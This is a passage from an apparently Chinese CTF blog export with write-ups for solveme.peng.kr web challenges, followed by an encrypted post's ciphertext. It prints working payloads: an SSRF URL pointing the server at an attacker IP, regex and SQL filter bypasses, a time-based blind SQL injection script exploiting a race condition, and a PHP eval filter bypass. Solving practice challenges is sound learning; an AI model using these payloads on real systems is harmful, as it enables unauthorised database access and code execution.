1http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr@ip_addr/plz%1agive%1ame 注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：） Replace filter关键代码如下 12345678910if(isset($_GET['say']) &amp;&amp; strlen($_GET['say']) &lt; 20)&#123; $say = preg_replace('/^(.*)flag(.*)$/', '$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;', $_GET['say']); if(preg_match('/give_me_the_flag/', $say))&#123; echo $flag; &#125;else&#123; echo 'What the f**k?'; &#125;&#125; 这里看学长的博客get到了新姿势，这个题目绕过的点在 .* 这里，这个可以匹配任意字符，但是不可以匹配换行，而 ^$ 又限制了字符串必须在同一行，所以绕过就简单了，payload 1http://replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag Hell JSAnti SQLi关键过滤如下 12345678910preg_match( '/\\.|\\`|\"|\\'|\\\\|\\xA0|\\x0B|0x0C|\\t|\\r|\\n|\\0|'. '=|&lt;|&gt;|\\(|\\)|@@|\\|\\||&amp;&amp;|#|\\/\\*.*\\*\\/|--[\\s\\xA0]|'. '0x[0-9a-f]+|0b[01]+|x\\'[0-9a-f]+\\'|b\\'[01]+\\'|'. '[\\s\\xA0\\'\"]+(as|or|and|r*like|regexp)[\\s\\xA0\\'\"]+|'. 'union[\\s\\xA0]+select|[\\s\\xA0](where|having)|'. '[\\s\\xA0](group|order)[\\s\\xA0]+by|limit[\\s\\xA0]+\\d|'. 'information_schema|procedure\\s+analyse\\s*/is', $id.','.$pw ) and die('Hack detected'); sql语句即判断条件1234567891011121314151617$result = mysqli_fetch_array( mysqli_query( $con, \"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');\" ) ); mysqli_close($con); if(isset($result))&#123; if($result['no'] === '31337')&#123; echo $flag; &#125;else&#123; echo 'Hello, ', $result['id']; &#125; &#125;else&#123; echo 'Login failed'; &#125; 该正则匹配中 |\\\\| 是无法匹配到 \\ 的，必须要用四个才可以，所以这道题目中 \\ 是可以用的，用 id=\\ 可以成功吃掉一个引号。正则中 union[\\s\\xA0]+select 还可考虑用 union all select 绕过，正则 --[\\s\\xA0] ，其中查资料发现 \\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\\f\\n\\r\\t\\v] 也就是说还有其它字符可以匹配，例如 %01,%11,%02 ，基于以上内容可以构造payload 1?id=1\\&amp;pw=union all select 1222,212,12 from antisqli--%10 最终payload 1?id=1\\&amp;pw=union all select 31337,2,3 from antisqli--%10 Name Check关键过滤如下 1if(preg_match(\"/admin|--|;|\\(\\)|\\/\\*|\\\\0/i\", $name)) 1234567891011121314151617181920$res = $sql-&gt;query(\" SELECT MAX('0','1','&#123;$name&#125;') LIKE 'a%', INSTR('&#123;$name&#125;','d')&gt;0, MIN('&#123;$name&#125;','b','c') LIKE '__m__', SUBSTR('&#123;$name&#125;',-2)='in' ;\"); if($res === false)&#123; echo 'Database error'; goto quit; &#125; $row = $res-&gt;fetchArray(SQLITE3_NUM); if( $row[0] + $row[1] + $row[2] + $row[3] !== 4 || array_sum($row) !== 4 )&#123; echo 'Auth failed'; goto quit; &#125; echo $flag; 看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 || 而不是 + ，所以payload： ?name=ad&#39;||&#39;min I am slowly12345678910111213141516171819202122232425262728if(isset($answer))&#123; $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname) or die('SQL server down'); $result = mysqli_fetch_array( mysqli_query($con, \"SELECT `count` FROM `&#123;$table&#125;`;\") ); if(!isset($result))&#123; mysqli_query($con, \"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);\"); $new_answer = md5(sha1('iamslowly_'.mt_rand().'_'.mt_rand().'_'.mt_rand())); mysqli_query($con, \"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);\"); &#125;elseif($result['count'] === '12')&#123; mysqli_query($con, \"DROP TABLE `&#123;$table&#125;`;\"); echo 'Game over'; goto quit; &#125; $randtime = mt_rand(1, 10); $result = mysqli_fetch_array( mysqli_query($con, \"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';\") ); if(isset($result) &amp;&amp; $result['answer'] === $answer)&#123; mysqli_query($con, \"DROP TABLE `&#123;$table&#125;`;\"); echo $flag; &#125;else&#123; mysqli_query($con, \"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;\"); echo 'Go fast'; &#125; 代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是： 判断count的值—&gt;执行SQL语句—&gt;加count值 按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer 123456789101112131415161718192021222324import requestskeys = '0123456789abcdef'header = &#123;\"Host\":\"iamslowly.thinkout.rf.gd\",\"Cache-Control\":\"max-age=0\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\",\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\",\"Referer\":\"http://solveme.peng.kr/chall\",\"Accept-Language\":\"zh-CN,zh;q=0.8\",\"Cookie\":\"__test=8f5247d83ccd8573674837d6f9a37fd1\"&#125;payload = '440763269e2fe7a672a52ea827728'for i in range(30): for j in keys: url = \"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(50),2)%23\".format(payload + j) try: content = requests.get(url,headers=header,timeout=30).content print(content[:10]) except: payload += j print(payload) break 这题目盲注时间有点长，这里贴一下结果 440763269e2fe7a672a52ea827728539 。 Check via eval主要代码如下 1234567891011121314$exam = 'return\\''.sha1(time()).'\\';';if (!isset($_GET['flag'])) &#123; echo '&lt;a href=\"./?flag='.$exam.'\"&gt;Click here&lt;/a&gt;';&#125;else if (strlen($_GET['flag']) != strlen($exam)) &#123; echo 'Not allowed length';&#125;else if (preg_match('/`|\"|\\.|\\\\\\\\|\\(|\\)|\\[|\\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) &#123; echo 'Not allowed keyword';&#125;else if (eval($_GET['flag']) === sha1($flag)) &#123; echo $flag;&#125; 题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 eval($_GET[&#39;flag&#39;]) 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 Click Here ，也就是说可以用 &lt;?= expression?&gt; 来达到绕过 echo 过滤的目的。 我们可以构造 &lt;?= flag?&gt; 来输出flag，尝试构造payload 1$a=&apos;alag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"萌宠养成记","slug":"Train-my-pet","date":"2018-07-24T10:35:04.000Z","updated":"2019-02-16T08:30:33.612Z","comments":true,"path":"2018/07/24/Train-my-pet/","link":"","permalink":"http://chaosec.top/2018/07/24/Train-my-pet/","excerpt":"The article has been encrypted, please enter your password to view.","text":"What's my pet's name? Incorrect Password! No content to display! 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